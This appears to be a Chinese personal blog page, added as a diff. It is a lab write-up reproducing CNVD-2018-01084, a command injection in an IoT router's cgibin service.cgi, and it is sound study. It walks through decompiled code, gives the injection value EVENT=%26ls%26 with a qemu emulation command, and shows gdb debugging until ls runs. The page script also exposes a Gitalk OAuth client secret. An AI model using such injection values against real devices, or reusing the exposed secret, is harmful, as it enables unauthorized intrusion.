@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>CNVD-2018-01084 漏洞复现 | 飞光</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://blog.augustu.top/favicon.ico?v=1697725872917">
+<link rel="stylesheet" href="https://blog.augustu.top/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="两周时间做的漏洞复现，中间遇到很多问题，希望后来者不要重蹈覆辙
+
+静态分析
+先使用binwalk解压文件后，使用IDA对cgibin文件进行分析
+查看main函数
+有如下信息
+int __cdecl main(int argc, const..." />
+    <meta name="keywords" content="漏洞复现,iot" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://blog.augustu.top">
+        <img src="https://blog.augustu.top/images/avatar.png?v=1697725872917" class="site-logo">
+        <h1 class="site-title">飞光</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+          <a class="social-link" href="https://github.com/AugustuXue" target="_blank">
+            <i class="fab fa-github"></i>
+          </a>
+        
+      
+        
+      
+        
+      
+        
+          <a class="social-link" href="https://www.zhihu.com/people/ming-wu-41-24" target="_blank">
+            <i class="fab fa-zhihu"></i>
+          </a>
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      吾不识青天高，黄地厚<br>
+唯见月寒日暖，来煎人寿
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://blog.augustu.top/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">CNVD-2018-01084 漏洞复现</h2>
+            <div class="post-date">2023-10-15</div>
+            
+              <div class="feature-container" style="background-image: url('http://www.toprie.com/images/before/20200615120843_553.jpg')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <p>两周时间做的漏洞复现，中间遇到很多问题，希望后来者不要重蹈覆辙</p>
+<!-- more -->
+<h2 id="静态分析">静态分析</h2>
+<p>先使用binwalk解压文件后，使用IDA对cgibin文件进行分析</p>
+<p>查看main函数</p>
+<p>有如下信息</p>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  const char *v3; // $s0
+  char *v6; // $v0
+  void (__noreturn *v8)(); // $t9
+  int v9; // $a0
+
+  v3 = *argv;
+  v6 = strrchr(*argv, 47);
+  if ( v6 )
+    v3 = v6 + 1;
+  if ( !strcmp(v3, &quot;scandir.sgi&quot;) )
+  {
+    v8 = (void (__noreturn *)())&amp;scandir_main;
+    v9 = argc;
+    return ((int (__fastcall *)(int, const char **, const char **))v8)(v9, argv, envp);
+  }
+……
+  if ( !strcmp(v3, &quot;service.cgi&quot;) )
+  {
+    v8 = (void (__noreturn *)())&amp;servicecgi_main;
+    v9 = argc;
+    return ((int (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);
+  }
+……
+  printf(&quot;CGI.BIN, unknown command %s\n&quot;, v3);
+  return 1;
+}
+</code></pre>
+<p>发现 cgibin 从 web 端接受了请求，然后取出 URL 中的访问参数，筛选出对应的 cgi 服务，并调用相关函数。</p>
+<p>而service.cgi对应的servicecgi_main代码如下</p>
+<pre><code class="language-c">int servicecgi_main()
+{
+  char *v0; // $v0
+……
+
+  memset(v15, 0, 0x100u);
+  v0 = getenv(&quot;REQUEST_METHOD&quot;);
+  v1 = v0;
+  if ( v0 )
+  {
+    if ( !strcasecmp(v0, &quot;POST&quot;) )
+    {
+      v2 = 1024;
+    }
+    else
+    {
+      if ( strcasecmp(v1, &quot;GET&quot;) )
+      {
+        snprintf(v15, 0x100u, &quot;Unsupport HTTP request - %s&quot;, v1);
+        goto LABEL_10;
+      }
+      v2 = 64;
+    }
+    if ( cgibin_parse_request(sub_40ADCC, 0, v2) &lt; 0 )
+    {
+      v4 = &quot;Unable to parse HTTP request&quot;;
+……
+  return result;
+}
+</code></pre>
+<p>初步分析后发现函数内部先处理传递进来的 HTTP 请求，利用 getenv 函数从系统环境变量中获取请求字段。</p>
+<p>首先获取了 REQUEST_METHOD 字段，判断是否为 POST，然后进入 cgibin_parse_request 函数进一步解析 HTTP 请求。</p>
+<p>进行分析后，发现cgibin_parse_request 函数中构造了 sobj 结构体，函数大致功能是取出 CONTENT_TYPE、CONTENT_LENGTH、REQUEST_URI 这几个请求字段，进行进一步操作。</p>
+<p>关键点在于 REQUEST_URI，它表示了当前请求的访问参数，关键代码如下：</p>
+<pre><code class="language-c">if ( v21 &amp;&amp; v8 )
+  {
+    v10 = getenv(&quot;REQUEST_URI&quot;);
+    if ( v10 )
+    {
+      //在字符串 v10 中查找第一次出现字符?的位置，并将该位置的指针赋值给变量v11。
+      v11 = strchr(v10, 63);
+      v9 = 0;
+      if ( v11 )
+      {
+        v12 = v11 + 1;
+        v20 = 0;
+        v23 = a1;
+        v24 = a2;
+        v13 = strlen(v11 + 1);
+        sub_402DC0(&amp;v20, v12, v13);
+        sub_402DC0(&amp;v20, 0, 0);
+        v9 = 0;
+      }
+    }
+    else
+    {
+      v9 = -1;
+    }
+  }
+</code></pre>
+<p>从 REQUEST_URI 中定位 ? ，然后取出问号之后的内容，计算长度。</p>
+<p>函数sub_402DC0 的主要功能是对取出的参数进行 URLdecode，并写入某块内存区域。</p>
+<p>当 cgibin_parse_request 函数完成了 HTTP 请求解析动作，并且正确的返回，servicecgi_main 函数会继续下一步操作。</p>
+<p>首先检查当前用户 session 是否为管理员，对应函数是 sess_ispoweruser，由于在模拟环境中，这个函数无法获取到 session，我们可以直接 patch 掉这个函数。身份验证成功之后继续解析 REQUEST_URI 的内容，涉及的指令有三个：EVENT、ACTION、SERVICE。</p>
+<p>观察代码发现 EVENT 的限制最少，当解析到 EVENT 的时候跳出 if 判断，进入 else 流程；</p>
+<pre><code>    v5 = sub_40A950(&quot;EVENT&quot;);
+    v7 = (const char *)sub_40A950(&quot;ACTION&quot;);
+    v6 = sub_40A950(&quot;SERVICE&quot;);
+    if ( v5 )
+    {
+      v8 = &quot;event %s &gt; /dev/null&quot;;
+    }
+    else
+    {
+      if ( !v6 || !v7 )
+        goto LABEL_27;
+      if ( !strcasecmp(v7, &quot;START&quot;) )
+      {
+        v8 = &quot;service %s start &gt; /dev/null&quot;;
+      }
+      else if ( !strcasecmp(v7, &quot;STOP&quot;) )
+      {
+        v8 = &quot;service %s stop &gt; /dev/null&quot;;
+      }
+      else
+      {
+        if ( strcasecmp(v7, &quot;RESTART&quot;) )
+        {
+          snprintf(v15, 0x100u, &quot;Unknown action - '%s'&quot;, v7);
+          goto LABEL_10;
+        }
+        v8 = &quot;service %s restart &gt; /dev/null&quot;;
+      }
+    }
+    lxmldbc_system(v8);
+</code></pre>
+<p>关键函数为 lxmldbc_system：</p>
+<pre><code class="language-c">int lxmldbc_system(char *format, ...)
+{
+  char v2[1028]; // [sp+1Ch] [-404h] BYREF
+  va_list va; // [sp+42Ch] [+Ch] BYREF
+
+  va_start(va, format);
+  vsnprintf(v2, 0x400u, format, va);
+  return system(v2);
+}
+</code></pre>
+<p>根据传入的参数，这个函数直接使用 vsnprintf 将 “event %s &gt; /dev/null” 和和用户传入的 EVENT 拼接，并利用 system 执行。</p>
+<p>这里显然存在命令注入漏洞，注入的格式大概是；</p>
+<pre><code>echo &quot;Hello&quot;&amp;ls&amp;pwd
+</code></pre>
+<p>运行上面的命令可以同时得到三条指令的结果。</p>
+<p>如果我们构造 EVENT=&amp;ls&amp;，那么拼接出来的结果就是 event &amp;ls&amp; &gt; /dev/null，从而完成任意命令执行。</p>
+<h2 id="漏洞复现">漏洞复现</h2>
+<p>测试一下，启动命令：</p>
+<blockquote>
+<p>-0：传入第一个参数，进入 servicecgi_main</p>
+<p>-E：选项传入自定义的环境变量</p>
+</blockquote>
+<pre><code class="language-sh">sudo chroot . ./qemu-mipsel \
+-0 &quot;service.cgi&quot; \
+-E REQUEST_METHOD=&quot;POST&quot; \
+-E CONTENT_LENGTH=10 \
+-E REQUEST_URI=&quot;service.cgi?EVENT=%26ls%26&quot; \
+-E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \
+-E HTTP_COOKIE=&quot;uid=skye231&quot; \
+./htdocs/cgibin 
+</code></pre>
+<p>加上调试解析函数看都是解析正确，单步调试就发现是成功解析后执行 retrun 函数并没有返回到上一层，而是继续往下执行  retrun v9 这是的 v9 为 -1 ：</p>
+<figure data-type="image" tabindex="1"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/202310141309070.png?x-oss-process=style/zip" alt="image-20210209231306395" loading="lazy"></figure>
+<p>直接patch掉</p>
+<figure data-type="image" tabindex="2"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/202310141310364.png?x-oss-process=style/zip" alt="image-20231006155115874" loading="lazy"></figure>
+<p>HTTP请求仍然有问题</p>
+<p>尝试使用动态调试</p>
+<figure data-type="image" tabindex="3"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/202310141310003.png?x-oss-process=style/zip" alt="image-20231006161053637" loading="lazy"></figure>
+<p>直接退出</p>
+<h3 id="思路">思路</h3>
+<figure data-type="image" tabindex="4"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/202310131504259.png?x-oss-process=style/zip" alt="image-20231013150406096" loading="lazy"></figure>
+<p>动态调试将v3，v6改成1</p>
+<h3 id="具体过程">具体过程</h3>
+<p>远程gdb连接调试</p>
+<h4 id="问题">问题</h4>
+<h5 id="调试闪退">调试闪退</h5>
+<p>调试后闪退，猜测是版本问题，使用gdb-7.10.1调试，可以进行</p>
+<p>尝试使用Ubuntu18安装GDB-7.10.1，但make时失败了，版本冲突</p>
+<p>安装Ubuntu16重新配置GDB及其插件，安装pwndbg也失败了，Ubuntu16自带的Python3.5语法与pwndbg文件有冲突</p>
+<p>最后使用gdb-peda和qemu调试，没有什么信息显示，师兄下断点查看寄存器，发现寄存器都是x86的寄存器，使用了自带的gdb</p>
+<figure data-type="image" tabindex="5"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20231013160652548.png?x-oss-process=style/zip" alt="image-20231013160652548" loading="lazy"></figure>
+<p>师兄帮助找到原因，应该使用gdb-multiarch来让它支持mips架构</p>
+<figure data-type="image" tabindex="6"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20231013161450908.png?x-oss-process=style/zip" alt="image-20231013161450908" loading="lazy"></figure>
+<p>重新使用pwndbg发现不再闪退</p>
+<figure data-type="image" tabindex="7"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/202310131425238.png?x-oss-process=style/zip" alt="image-20231013113734700" loading="lazy"></figure>
+<h4 id="动调过程">动调过程</h4>
+<p>在这里下断点，将$v0赋值为1</p>
+<figure data-type="image" tabindex="8"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20231013124117924.png?x-oss-process=style/zip" alt="image-20231013124117924" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20231013150746684.png?x-oss-process=style/zip" alt="image-20231013150746684" loading="lazy"></figure>
+<p>继续下断点，检查v6，如果不符合条件就改值</p>
+<figure data-type="image" tabindex="10"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20231013151001960.png?x-oss-process=style/zip" alt="image-20231013151001960" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20231013152307651.png?x-oss-process=style/zip" alt="image-20231013152307651" loading="lazy"></figure>
+<p>发现进入循环</p>
+<p>开始步进调试</p>
+<figure data-type="image" tabindex="12"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20231013152728820.png?x-oss-process=style/zip" alt="image-20231013152728820" loading="lazy"></figure>
+<p>发现虽然在IDA中反编译显示patch掉了原来的sess_ispower函数，但其实没有成功，真正执行时仍然进入了</p>
+<figure data-type="image" tabindex="13"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/202310141329316.png?x-oss-process=style/zip" alt="image-20231013152948836" loading="lazy"></figure>
+<p>所以将$t9赋值为0xab58，直接跳转</p>
+<p>在0x40ab24处下断点，改寄存器</p>
+<figure data-type="image" tabindex="14"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/202310141329913.png?x-oss-process=style/zip" alt="image-20231013153822503" loading="lazy"></figure>
+<p>两步ni后发现成功进入目标函数</p>
+<figure data-type="image" tabindex="15"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/202310141329954.png?x-oss-process=style/zip" alt="image-20231013153915385" loading="lazy"></figure>
+<p>继续下断点后，如果不断步入可以看到成功拼接</p>
+<figure data-type="image" tabindex="16"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/202310141329144.png?x-oss-process=style/zip" alt="image-20231013155355203" loading="lazy"></figure>
+<p>到此处直接继续执行，可以看到ls命令成功执行</p>
+<figure data-type="image" tabindex="17"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/202310141329472.png?x-oss-process=style/zip" alt="image-20231013124853388" loading="lazy"></figure>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://blog.augustu.top/tag/e1G_BcQFr/" class="tag">
+                    漏洞复现
+                  </a>
+                
+                  <a href="https://blog.augustu.top/tag/0bVr0mp1_V/" class="tag">
+                    iot
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://blog.augustu.top/post/flomo/">
+                  <h3 class="post-title">
+                    flomo数据导入到memos项目
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: 'ff3b204017fefc20c2a7',
+        clientSecret: '325269c895db78df64762d2bda6b530cd3e7e6f3',
+        repo: 'gitalk',
+        owner: 'AugustuHugo',
+        admin: ['AugustuHugo'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
